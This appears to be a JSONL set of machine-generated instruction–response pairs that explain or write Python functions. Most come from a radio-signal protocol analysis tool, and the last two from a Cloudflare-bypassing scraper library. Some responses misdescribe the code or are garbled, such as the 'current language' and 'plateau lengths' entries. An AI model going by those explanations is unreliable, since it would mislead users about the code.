{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef cwt_haar(x: np.ndarray, scale=10):\n    next_power_two = 2 ** int(np.log2(len(x)))\n\n    x = x[0:next_power_two]\n    num_data = len(x)\n\n    # get FFT of x (eq. (3) in paper)\n    x_hat = np.fft.fft(x)\n\n    # Get omega (eq. (5) in paper)\n    f = (2.0 * np.pi / num_data)\n    omega = f * np.concatenate((np.arange(0, num_data // 2), np.arange(num_data // 2, num_data) * -1))\n\n    # get psi hat (eq. (6) in paper)\n    psi_hat = np.sqrt(2.0 * np.pi * scale) * normalized_haar_wavelet(scale * omega, scale)\n\n    # get W (eq. (4) in paper)\n    W = np.fft.ifft(x_hat * psi_hat)\n\n    return W[2 * scale:-2 * scale]", "response": "continuous haar wavelet transform based on the paper\n    continuous haar wavelet analysis by Christopher Torrence and Gilbert P Compo"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef __find_sync_range(self, messages, preamble_end: int, search_end: int):\n\n        possible_sync_pos = defaultdict(int)\n\n\n        for i, msg in enumerate(messages):\n            bits_i = msg.decoded_bits[preamble_end:search_end]\n            for j in range(i, len(messages)):\n                bits_j = messages[j].decoded_bits[preamble_end:search_end]\n                first_diff = next((k for k, (bit_i, bit_j) in enumerate(zip(bits_i, bits_j)) if bit_i != bit_j), None)\n                if first_diff is not None:\n                    first_diff = preamble_end + 4 * (first_diff // 4)\n                    if (first_diff - preamble_end) >= 4:\n                        possible_sync_pos[(preamble_end, first_diff)] += 1\n        try:\n            sync_interval = max(possible_sync_pos, key=possible_sync_pos.__getitem__)\n            return sync_interval\n        except ValueError:\n            return None", "response": "Find the synchronization interval between two messages."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef __pad_until_index(self, row: int, bit_pos: int):\n        try:\n            new_bits = array.array(\"B\", [0] * max(0, bit_pos - len(self.protocol.messages[row])))\n            if len(new_bits) == 0:\n                return True\n\n            self.protocol.messages[row].plain_bits = self.protocol.messages[row].plain_bits + new_bits\n            msg = self.protocol.messages[row]\n            self.display_data[\n                row] = msg.plain_bits if self.proto_view == 0 else msg.plain_hex_array if self.proto_view == 1 else msg.plain_ascii_array\n        except IndexError:\n            return False\n\n        return True", "response": "Pads message in given row with zeros until given column so user can enter values behind end of message\n           "}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef find_differences(self, refindex: int):\n        differences = defaultdict(set)\n\n        if refindex >= len(self.protocol.messages):\n            return differences\n\n        if self.proto_view == 0:\n            proto = self.protocol.decoded_proto_bits_str\n        elif self.proto_view == 1:\n            proto = self.protocol.decoded_hex_str\n        elif self.proto_view == 2:\n            proto = self.protocol.decoded_ascii_str\n        else:\n            return differences\n\n        ref_message = proto[refindex]\n        ref_offset = self.get_alignment_offset_at(refindex)\n\n        for i, message in enumerate(proto):\n            if i == refindex:\n                continue\n\n            msg_offset = self.get_alignment_offset_at(i)\n            short, long = sorted([len(ref_message) + ref_offset, len(message) + msg_offset])\n\n            differences[i] = {\n                j for j in range(max(msg_offset, ref_offset), long)\n                if j >= short or message[j - msg_offset] != ref_message[j - ref_offset]\n            }\n\n        return differences", "response": "Search all differences between protocol messages regarding a reference message."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create_rectangle(proto_bits, pulse_len=100):\n        ones = np.ones(pulse_len, dtype=np.float32) * 1\n        zeros = np.ones(pulse_len, dtype=np.float32) * -1\n        n = 0\n        y = []\n        for msg in proto_bits:\n            for bit in msg:\n                n += pulse_len\n                if bit == \"0\":\n                    y.extend(zeros)\n                else:\n                    y.extend(ones)\n        x = np.arange(0, n).astype(np.int64)\n        scene = ZoomableScene()\n        scene.setSceneRect(0, -1, n, 2)\n        scene.setBackgroundBrush(constants.BGCOLOR)\n        scene.addLine(0, 0, n, 0, QPen(constants.AXISCOLOR, 0))\n        if len(y) > 0:\n            y = np.array(y)\n        else:\n            y = np.array(y).astype(np.float32)\n        path = path_creator.array_to_QPath(x, y)\n        scene.addPath(path, QPen(constants.LINECOLOR, 0))\n        return scene, n", "response": "Create a rectangle that contains the contents of the given list of message types."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsetting the parameters of the current spectrogram.", "response": "def set_parameters(self, samples: np.ndarray, window_size, data_min, data_max) -> bool:\n        \"\"\"\n        Return true if redraw is needed\n        \"\"\"\n        redraw_needed = False\n        if self.samples_need_update:\n            self.spectrogram.samples = samples\n            redraw_needed = True\n            self.samples_need_update = False\n\n        if window_size != self.spectrogram.window_size:\n            self.spectrogram.window_size = window_size\n            redraw_needed = True\n\n        if data_min != self.spectrogram.data_min:\n            self.spectrogram.data_min = data_min\n            redraw_needed = True\n\n        if data_max != self.spectrogram.data_max:\n            self.spectrogram.data_max = data_max\n            redraw_needed = True\n\n        return redraw_needed"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the next action from the selection.", "response": "def get_action(self, parent, undo_stack: QUndoStack, sel_range, protocol: ProtocolAnalyzer, view: int):\n        \"\"\"\n        :type parent: QTableView\n        :type undo_stack: QUndoStack\n        :type protocol_analyzers: list of ProtocolAnalyzer\n        \"\"\"\n        min_row, max_row, start, end = sel_range\n        if min_row == -1 or max_row == -1 or start == -1 or end == -1:\n            return None\n\n        if max_row != min_row:\n            return None\n\n        end = protocol.convert_index(end, view, 0, True, message_indx=min_row)[0]\n        # factor = 1 if view == 0 else 4 if view == 1 else 8\n\n        self.command = MessageBreakAction(protocol, max_row, end)\n        action = QAction(self.command.text(), parent)\n        action.triggered.connect(self.action_triggered)\n        self.undo_stack = undo_stack\n        return action"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the length of this message in byte.", "response": "def get_byte_length(self, decoded=True) -> int:\n        \"\"\"\n        Return the length of this message in byte.\n\n        \"\"\"\n        end = len(self.decoded_bits) if decoded else len(self.__plain_bits)\n        end = self.convert_index(end, 0, 2, decoded=decoded)[0]\n        return int(end)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget the SRC address of a message from the data.", "response": "def get_src_address_from_data(self, decoded=True):\n        \"\"\"\n        Return the SRC address of a message if SRC_ADDRESS label is present in message type of the message\n        Return None otherwise\n\n        :param decoded:\n        :return:\n        \"\"\"\n        src_address_label = next((lbl for lbl in self.message_type if lbl.field_type\n                                  and lbl.field_type.function == FieldType.Function.SRC_ADDRESS), None)\n        if src_address_label:\n            start, end = self.get_label_range(src_address_label, view=1, decode=decoded)\n            if decoded:\n                src_address = self.decoded_hex_str[start:end]\n            else:\n                src_address = self.plain_hex_str[start:end]\n        else:\n            src_address = None\n\n        return src_address"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef split(self, decode=True):\n        start = 0\n        result = []\n        message = self.decoded_bits if decode else self.plain_bits\n        bit_alignments = set()\n        if self.align_labels:\n            for l in self.message_type:\n                bit_alignments.add(l.start)\n                bit_alignments.add(l.end)\n\n        self.__bit_alignments = sorted(bit_alignments)\n\n        for pos in self.__bit_alignments:\n            result.append(message[start:pos])\n            start = pos\n\n        result.append(message[start:])\n        return result", "response": "Returns a list of the bit - alignment entries in the message."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef set_e(self):\n        if self.ui.combobox_decodings.count() < 1:  # Empty list\n            return\n\n        self.e = copy.deepcopy(self.decodings[self.ui.combobox_decodings.currentIndex()])\n        \"\"\":type: encoding \"\"\"\n        chain = self.e.get_chain()\n        self.ui.decoderchain.clear()\n        self.chainoptions.clear()\n        last_i = \"\"\n        for i in chain:\n            if i in [constants.DECODING_INVERT, constants.DECODING_ENOCEAN, constants.DECODING_DIFFERENTIAL,\n                     constants.DECODING_REDUNDANCY, constants.DECODING_CARRIER, constants.DECODING_BITORDER,\n                     constants.DECODING_EDGE, constants.DECODING_DATAWHITENING, constants.DECODING_SUBSTITUTION,\n                     constants.DECODING_EXTERNAL, constants.DECODING_CUT, constants.DECODING_MORSE,\n                     constants.DECODING_DISABLED_PREFIX]:\n                self.ui.decoderchain.addItem(i)\n                self.decoderchainUpdate()\n                last_i = self.ui.decoderchain.item(self.ui.decoderchain.count() - 1).text()\n            else:\n                if any(x in last_i for x in [constants.DECODING_REDUNDANCY, constants.DECODING_CARRIER,\n                                             constants.DECODING_SUBSTITUTION, constants.DECODING_EXTERNAL,\n                                             constants.DECODING_DATAWHITENING, constants.DECODING_CUT,\n                                             constants.DECODING_MORSE]):\n                    self.chainoptions[last_i] = i\n\n        self.decoderchainUpdate()\n        self.decoder_update()\n        self.ui.saveas.setVisible(False)", "response": "Sets the current language of the current language in the decoder chain."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a dictionary of all the protocols in the hierarchy", "response": "def protocols(self):\n        \"\"\"\n        :rtype: dict[int, list of ProtocolAnalyzer]\n        \"\"\"\n        result = {}\n        for i, group in enumerate(self.rootItem.children):\n            result[i] = [child.protocol for child in group.children]\n\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a dictionary of all the protocol tree items in the tree.", "response": "def protocol_tree_items(self):\n        \"\"\"\n        :rtype: dict[int, list of ProtocolTreeItem]\n        \"\"\"\n        result = {}\n        for i, group in enumerate(self.rootItem.children):\n            result[i] = [child for child in group.children]\n\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nmoving the items to a new group.", "response": "def move_to_group(self, items, new_group_id: int):\n        \"\"\"\n        :type items: list of ProtocolTreeItem\n        \"\"\"\n        group = self.rootItem.child(new_group_id)\n        for item in items:\n            group.appendChild(item)\n        self.controller.refresh()"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsets all protocols in copy mode.", "response": "def set_copy_mode(self, use_copy: bool):\n        \"\"\"\n        Set all protocols in copy mode. They will return a copy of their protocol.\n        This is used for writable mode in CFC.\n\n        :param use_copy:\n        :return:\n        \"\"\"\n        for group in self.rootItem.children:\n            for proto in group.children:\n                proto.copy_data = use_copy"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting a representation of the ring buffer for plotting. This is expensive so it is expensive so it is only used in frontend.", "response": "def view_data(self):\n        \"\"\"\n        Get a representation of the ring buffer for plotting. This is expensive, so it should only be used in frontend\n        :return:\n        \"\"\"\n        left, right = self.left_index, self.left_index + len(self)\n        if left > right:\n            left, right = right, left\n\n        data = np.frombuffer(self.__data.get_obj(), dtype=np.complex64)\n        return np.concatenate((data[left:right], data[right:], data[:left]))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef push(self, values: np.ndarray):\n        n = len(values)\n        if len(self) + n > self.size:\n            raise ValueError(\"Too much data to push to RingBuffer\")\n\n        slide_1 = np.s_[self.right_index:min(self.right_index + n, self.size)]\n        slide_2 = np.s_[:max(self.right_index + n - self.size, 0)]\n        with self.__data.get_lock():\n            data = np.frombuffer(self.__data.get_obj(), dtype=np.complex64)\n            data[slide_1] = values[:slide_1.stop - slide_1.start]\n            data[slide_2] = values[slide_1.stop - slide_1.start:]\n            self.right_index += n\n\n        self.__length.value += n", "response": "Push values to buffer."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef pop(self, number: int, ensure_even_length=False):\n        if ensure_even_length:\n            number -= number % 2\n\n        if len(self) == 0 or number == 0:\n            return np.array([], dtype=np.complex64)\n\n        if number < 0:\n            # take everything\n            number = len(self)\n        else:\n            number = min(number, len(self))\n\n        with self.__data.get_lock():\n            data = np.frombuffer(self.__data.get_obj(), dtype=np.complex64)\n\n            result = np.empty(number, dtype=np.complex64)\n\n            if self.left_index + number > len(data):\n                end = len(data) - self.left_index\n            else:\n                end = number\n\n            result[:end] = data[self.left_index:self.left_index + end]\n            if end < number:\n                result[end:] = data[:number-end]\n\n        self.left_index += number\n        self.__length.value -= number\n\n        return result", "response": "Pop a number of elements from the buffer."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef code_data_whitening(self, decoding, inpt):\n        inpt_copy = array.array(\"B\", inpt)\n        return self.apply_data_whitening(decoding, inpt_copy)", "response": "XOR Data Whitening\n        :param decoding:\n        :param inpt:\n        :return:"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the action for this table.", "response": "def get_action(self, parent, undo_stack: QUndoStack, sel_range, protocol, view: int):\n        \"\"\"\n        :type parent: QTableView\n        :type undo_stack: QUndoStack\n        \"\"\"\n        self.command = ZeroHideAction(protocol, self.following_zeros, view, self.zero_hide_offsets)\n        action = QAction(self.command.text(), parent)\n        action.triggered.connect(self.action_triggered)\n        self.undo_stack = undo_stack\n        return action"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef scroll_mouse(self, mouse_x: int):\n        scrollbar = self.horizontalScrollBar()\n\n        if mouse_x - self.view_rect().x() > self.view_rect().width():\n            scrollbar.setValue(scrollbar.value() + 5)\n\n        elif mouse_x < self.view_rect().x():\n            scrollbar.setValue(scrollbar.value() - 5)", "response": "Scrolls the mouse if ROI Selection reaches corner of view"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef refresh_selection_area(self):\n        self.__set_selection_area(x=self.selection_area.x, y=self.selection_area.y,\n                                  w=self.selection_area.width, h=self.selection_area.height)", "response": "Refresh the selection area in case scene was resized or scaled."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef view_rect(self) -> QRectF:\n        top_left = self.mapToScene(0, 0)\n        bottom_right = self.mapToScene(self.viewport().width() - 1, self.viewport().height() - 1)\n        return QRectF(top_left, bottom_right)", "response": "Return the boundaries of the view in scene coordinates"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef dropEvent(self, event: QDropEvent):\n        items = [item for item in self.items(event.scenePos()) if isinstance(item, GraphicsItem) and item.acceptDrops()]\n        item = None if len(items) == 0 else items[0]\n        if len(event.mimeData().urls()) > 0:\n            self.files_dropped.emit(event.mimeData().urls())\n\n        indexes = list(event.mimeData().text().split(\"/\")[:-1])\n\n        group_nodes = []\n        file_nodes = []\n        for index in indexes:\n            try:\n                row, column, parent = map(int, index.split(\",\"))\n                if parent == -1:\n                    parent = self.tree_root_item\n                else:\n                    parent = self.tree_root_item.child(parent)\n                node = parent.child(row)\n                if node.is_group:\n                    group_nodes.append(node)\n                else:\n                    file_nodes.append(node)\n            except ValueError:\n                continue\n\n        # Which Nodes to add?\n        nodes_to_add = []\n        \"\"\":type: list of ProtocolTreeItem \"\"\"\n        for group_node in group_nodes:\n            nodes_to_add.extend(group_node.children)\n        nodes_to_add.extend([file_node for file_node in file_nodes if file_node not in nodes_to_add])\n        protocols_to_add = [node.protocol for node in nodes_to_add]\n\n        ref_item = item\n        position = None if ref_item is None else item.drop_indicator_position\n        self.add_protocols(ref_item, position, protocols_to_add)\n        super().dropEvent(event)", "response": "Adds the protocol tree item to the tree."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconverts a bit array to a string.", "response": "def convert_bits_to_string(bits, output_view_type: int, pad_zeros=False, lsb=False, lsd=False, endianness=\"big\"):\n    \"\"\"\n    Convert bit array to string\n    :param endianness: Endianness little or big\n    :param bits: Bit array\n    :param output_view_type: Output view type index\n    0 = bit, 1=hex, 2=ascii, 3=decimal 4=binary coded decimal (bcd)\n    :param pad_zeros:\n    :param lsb: Least Significant Bit   -> Reverse bits first\n    :param lsd: Least Significant Digit -> Reverse result at end\n    :return:\n    \"\"\"\n    bits_str = \"\".join([\"1\" if b else \"0\" for b in bits])\n\n    if output_view_type == 4:\n        # For BCD we need to enforce padding\n        pad_zeros = True\n\n    if pad_zeros and output_view_type in (1, 2, 4):\n        n = 4 if output_view_type in (1, 4) else 8 if output_view_type == 2 else 1\n        bits_str += \"0\" * ((n - (len(bits_str) % n)) % n)\n\n    if lsb:\n        # Reverse bit string\n        bits_str = bits_str[::-1]\n\n    if endianness == \"little\":\n        # reverse byte wise\n        bits_str = \"\".join(bits_str[max(i - 8, 0):i] for i in range(len(bits_str), 0, -8))\n\n    if output_view_type == 0:  # bit\n        result = bits_str\n\n    elif output_view_type == 1:  # hex\n        result = \"\".join([\"{0:x}\".format(int(bits_str[i:i + 4], 2)) for i in range(0, len(bits_str), 4)])\n\n    elif output_view_type == 2:  # ascii\n        result = \"\".join(map(chr,\n                             [int(\"\".join(bits_str[i:i + 8]), 2) for i in range(0, len(bits_str), 8)]))\n\n    elif output_view_type == 3:  # decimal\n        try:\n            result = str(int(bits_str, 2))\n        except ValueError:\n            return None\n    elif output_view_type == 4:  # bcd\n        result = \"\".join([BCD_LUT[bits_str[i:i + 4]] for i in range(0, len(bits_str), 4)])\n    else:\n        raise ValueError(\"Unknown view type\")\n\n    if lsd:\n        # reverse result\n        return result[::-1]\n    else:\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef __ensure_message_length_multiple(bit_data, bit_len: int, pauses, bit_sample_pos, divisor: int):\n        for i in range(len(bit_data)):\n            missing_bits = (divisor - (len(bit_data[i]) % divisor)) % divisor\n            if missing_bits > 0 and pauses[i] >= bit_len * missing_bits:\n                bit_data[i].extend([0] * missing_bits)\n                pauses[i] = pauses[i] - missing_bits * bit_len\n\n                try:\n                    bit_sample_pos[i][-1] = bit_sample_pos[i][-2] + bit_len\n                except IndexError as e:\n                    logger.warning(\"Error padding message \" + str(e))\n                    continue\n\n                bit_sample_pos[i].extend([bit_sample_pos[i][-1] + (k + 1) * bit_len for k in range(missing_bits - 1)])\n                bit_sample_pos[i].append(bit_sample_pos[i][-1] + pauses[i])", "response": "This method is used to ensure that the bit_len of the message is multiple of the bit_len of the message."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_samplepos_of_bitseq(self, start_message: int, start_index: int, end_message: int, end_index: int,\n                                include_pause: bool):\n        \"\"\"\n        Determine on which place (regarding samples) a bit sequence is\n        :rtype: tuple[int,int]\n        \"\"\"\n        try:\n            if start_message > end_message:\n                start_message, end_message = end_message, start_message\n\n            if start_index >= len(self.messages[start_message].bit_sample_pos) - 1:\n                start_index = len(self.messages[start_message].bit_sample_pos) - 1\n                if not include_pause:\n                    start_index -= 1\n\n            if end_index >= len(self.messages[end_message].bit_sample_pos) - 1:\n                end_index = len(self.messages[end_message].bit_sample_pos) - 1\n                if not include_pause:\n                    end_index -= 1\n\n            start = self.messages[start_message].bit_sample_pos[start_index]\n            num_samples = self.messages[end_message].bit_sample_pos[end_index] - start\n\n            return start, num_samples\n        except (KeyError, IndexError):\n            return -1, -1", "response": "Returns the position of the first bit sequence in the message."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_bitseq_from_selection(self, selection_start: int, selection_width: int):\n        start_message, start_index, end_message, end_index = -1, -1, -1, -1\n        if not self.messages or not self.messages[0].bit_sample_pos:\n            return start_message, start_index, end_message, end_index\n\n        if selection_start + selection_width < self.messages[0].bit_sample_pos[0]:\n            return start_message, start_index, end_message, end_index\n\n        for i, msg in enumerate(self.messages):\n            msg_sample_pos = msg.bit_sample_pos\n            if msg_sample_pos[-2] < selection_start:\n                continue\n            elif start_message == -1:\n                start_message = i\n                for j, sample_pos in enumerate(msg_sample_pos):\n                    if sample_pos < selection_start:\n                        continue\n                    elif start_index == -1:\n                        start_index = j\n                        if msg_sample_pos[-1] - selection_start < selection_width:\n                            break\n                    elif sample_pos - selection_start > selection_width:\n                        return start_message, start_index, i, j\n            elif msg_sample_pos[-1] - selection_start < selection_width:\n                continue\n            else:\n                for j, sample_pos in enumerate(msg_sample_pos):\n                    if sample_pos - selection_start > selection_width:\n                        return start_message, start_index, i, j\n\n        last_message = len(self.messages) - 1\n        last_index = len(self.messages[-1].plain_bits) + 1\n        return start_message, start_index, last_message, last_index", "response": "get start and end index of bit sequence from selected samples"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef convert_index(self, index: int, from_view: int, to_view: int, decoded: bool, message_indx=-1) -> tuple:\n        if len(self.messages) == 0:\n            return 0, 0\n\n        if message_indx == -1:\n            message_indx = self.messages.index(max(self.messages, key=len))  # Longest message\n\n        if message_indx >= len(self.messages):\n            message_indx = len(self.messages) - 1\n\n        return self.messages[message_indx].convert_index(index, from_view, to_view, decoded)", "response": "Convert an index into a new version of the current version."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef estimate_frequency_for_one(self, sample_rate: float, nbits=42) -> float:\n        return self.__estimate_frequency_for_bit(True, sample_rate, nbits)", "response": "Calculates the frequency of at most nbits logical ones and returns the mean of these frequencies."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef estimate_frequency_for_zero(self, sample_rate: float, nbits=42) -> float:\n        return self.__estimate_frequency_for_bit(False, sample_rate, nbits)", "response": "Calculates the frequency of at most nbits logical zeros and returns the mean of these frequencies."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef auto_assign_decodings(self, decodings):\n        nrz_decodings = [decoding for decoding in decodings if decoding.is_nrz or decoding.is_nrzi]\n        fallback = nrz_decodings[0] if nrz_decodings else None\n        candidate_decodings = [decoding for decoding in decodings\n                               if decoding not in nrz_decodings and not decoding.contains_cut]\n\n        for message in self.messages:\n            decoder_found = False\n\n            for decoder in candidate_decodings:\n                if decoder.applies_for_message(message.plain_bits):\n                    message.decoder = decoder\n                    decoder_found = True\n                    break\n\n            if not decoder_found and fallback:\n                message.decoder = fallback", "response": "Auto - assigns the decodings to the message objects."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef selection_range(self):\n        selected = self.selectionModel().selection()\n        \"\"\":type: QItemSelection \"\"\"\n\n        if selected.isEmpty():\n            return -1, -1\n\n        min_row = min(rng.top() for rng in selected)\n        max_row = max(rng.bottom() for rng in selected)\n\n        return min_row, max_row", "response": "Returns the selection range of the selected items."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef cleanup():\n    script_dir = os.path.dirname(__file__) if not os.path.islink(__file__) else os.path.dirname(os.readlink(__file__))\n    script_dir = os.path.realpath(os.path.join(script_dir, \"..\"))\n    shutil.rmtree(os.path.join(script_dir, \"dist\"), ignore_errors=True)\n    shutil.rmtree(os.path.join(script_dir, \"tmp\"), ignore_errors=True)\n    shutil.rmtree(os.path.join(script_dir, \"urh.egg-info\"), ignore_errors=True)\n    shutil.rmtree(os.path.join(script_dir, \"src\", \"urh.egg-info\"), ignore_errors=True)\n    shutil.rmtree(os.path.join(script_dir, \"src\", \"urh\", \"tmp\"), ignore_errors=True)", "response": "Remove all cache directories\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef selection_range(self):\n        selected = self.selectionModel().selection()  # type: QItemSelection\n        if self.selection_is_empty:\n            return -1, -1, -1, -1\n\n        def range_to_tuple(rng):\n            return rng.row(), rng.column()\n\n        top_left = min(range_to_tuple(rng.topLeft()) for rng in selected)\n        bottom_right = max(range_to_tuple(rng.bottomRight()) for rng in selected)\n\n        return top_left[0], bottom_right[0], top_left[1], bottom_right[1] + 1", "response": "Returns the range of the selected items."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the most frequent value in list.", "response": "def get_most_frequent_value(values: list):\n    \"\"\"\n    Return the most frequent value in list.\n    If there is no unique one, return the maximum of the most frequent values\n\n    :param values:\n    :return:\n    \"\"\"\n    if len(values) == 0:\n        return None\n\n    most_common = Counter(values).most_common()\n    result, max_count = most_common[0]\n    for value, count in most_common:\n        if count < max_count:\n            return result\n        else:\n            result = value\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the list of start end indices of messages in the sequence of magnitudes.", "response": "def segment_messages_from_magnitudes(magnitudes: np.ndarray, noise_threshold: float):\n    \"\"\"\n    Get the list of start, end indices of messages\n\n    :param magnitudes: Magnitudes of samples\n    :param noise_threshold: Threshold for noise\n    :return:\n    \"\"\"\n    return c_auto_interpretation.segment_messages_from_magnitudes(magnitudes, noise_threshold)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef round_plateau_lengths(plateau_lengths: list):\n    # round to n_digits of most common value\n    digit_counts = [len(str(p)) for p in plateau_lengths]\n    n_digits = min(3, int(np.percentile(digit_counts, 50)))\n    f = 10 ** (n_digits - 1)\n\n    for i, plateau_len in enumerate(plateau_lengths):\n        plateau_lengths[i] = int(round(plateau_len / f)) * f", "response": "Round plateau lengths to next divisible number of digits e. g. 99 293 293."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef on_files_dropped_on_group(self, files, group_id: int):\n        self.__add_urls_to_group(files, group_id=group_id)", "response": "Called when the files list is dropped from a group."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef load_installed_plugins(self):\n        result = []\n        plugin_dirs = [d for d in os.listdir(self.plugin_path) if os.path.isdir(os.path.join(self.plugin_path, d))]\n        settings = constants.SETTINGS\n\n        for d in plugin_dirs:\n            if d == \"__pycache__\":\n                continue\n            try:\n                class_module = self.load_plugin(d)\n                plugin = class_module()\n                plugin.plugin_path = os.path.join(self.plugin_path, plugin.name)\n                plugin.load_description()\n                plugin.enabled = settings.value(plugin.name, type=bool) if plugin.name in settings.allKeys() else False\n                result.append(plugin)\n            except ImportError as e:\n                logger.warning(\"Could not load plugin {0} ({1})\".format(d, e))\n                continue\n\n        return result", "response": "Loads all installed plugins and returns a list of plugins."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a list of indexes of the zero sequence in the message.", "response": "def __get_zero_seq_indexes(self, message: str, following_zeros: int):\n        \"\"\"\n        :rtype: list[tuple of int]\n        \"\"\"\n\n        result = []\n        if following_zeros > len(message):\n            return result\n\n        zero_counter = 0\n        for i in range(0, len(message)):\n            if message[i] == \"0\":\n                zero_counter += 1\n            else:\n                if zero_counter >= following_zeros:\n                    result.append((i - zero_counter, i))\n                zero_counter = 0\n\n        if zero_counter >= following_zeros:\n            result.append((len(message) - 1 - following_zeros, len(message) - 1))\n\n        return result"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nread the new device messages and returns a string of new device messages separated by newlines.", "response": "def read_messages(self) -> str:\n        \"\"\"\n        returns a string of new device messages separated by newlines\n\n        :return:\n        \"\"\"\n        if self.backend == Backends.grc:\n            errors = self.__dev.read_errors()\n\n            if \"FATAL: \" in errors:\n                self.fatal_error_occurred.emit(errors[errors.index(\"FATAL: \"):])\n\n            return errors\n        elif self.backend == Backends.native:\n            messages = \"\\n\".join(self.__dev.device_messages)\n            self.__dev.device_messages.clear()\n\n            if messages and not messages.endswith(\"\\n\"):\n                messages += \"\\n\"\n\n            if \"successfully started\" in messages:\n                self.ready_for_action.emit()\n            elif \"failed to start\" in messages:\n                self.fatal_error_occurred.emit(messages[messages.index(\"failed to start\"):])\n\n            return messages\n        elif self.backend == Backends.network:\n            return \"\"\n        else:\n            raise ValueError(\"Unsupported Backend\")"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngetting the action for the current node.", "response": "def get_action(self, parent, undo_stack: QUndoStack, sel_range, groups,\n                   view: int) -> QUndoCommand:\n        \"\"\"\n        :type parent: QTableView\n        :type undo_stack: QUndoStack\n        :type groups: list of ProtocolGroups\n        \"\"\"\n        raise NotImplementedError(\"Abstract Method.\")"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef calculate(self, msg: array.array) -> array.array:\n        try:\n            if self.mode == self.ChecksumMode.auto:\n                if msg[0:4] == util.hex2bit(\"5\") or msg[0:4] == util.hex2bit(\"6\"):\n                    # Switch telegram\n                    return self.checksum4(msg)\n\n                status = msg[-16:-8]\n                if status[0]:\n                    return self.crc8(msg[:-8])  # ignore trailing hash\n                else:\n                    return self.checksum8(msg[:-8])  # ignore trailing hash\n\n            elif self.mode == self.ChecksumMode.checksum4:\n                return self.checksum4(msg)\n            elif self.mode == self.ChecksumMode.checksum8:\n                return self.checksum8(msg[:-8])\n            elif self.mode == self.ChecksumMode.crc8:\n                return self.crc8(msg[:-8])\n\n        except IndexError:\n            return None", "response": "Calculates the checksum for a WSP message."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the child with the given number.", "response": "def child(self, number):\n        \"\"\"\n        :type number: int\n        :rtype: ProtocolTreeItem\n        \"\"\"\n        if number < self.childCount():\n            return self.__childItems[number]\n        else:\n            return False"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncreates a new instance of the CloudFlareScraper class.", "response": "def create_scraper(cls, sess=None, **kwargs):\n        \"\"\"\n        Convenience function for creating a ready-to-go CloudflareScraper object.\n        \"\"\"\n        scraper = cls(**kwargs)\n\n        if sess:\n            attrs = [\"auth\", \"cert\", \"cookies\", \"headers\", \"hooks\", \"params\", \"proxies\", \"data\"]\n            for attr in attrs:\n                val = getattr(sess, attr, None)\n                if val:\n                    setattr(scraper, attr, val)\n\n        return scraper"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_cookie_string(cls, url, user_agent=None, **kwargs):\n        tokens, user_agent = cls.get_tokens(url, user_agent=user_agent, **kwargs)\n        return \"; \".join(\"=\".join(pair) for pair in tokens.items()), user_agent", "response": "Convenience function for building a Cookie HTTP header value."}
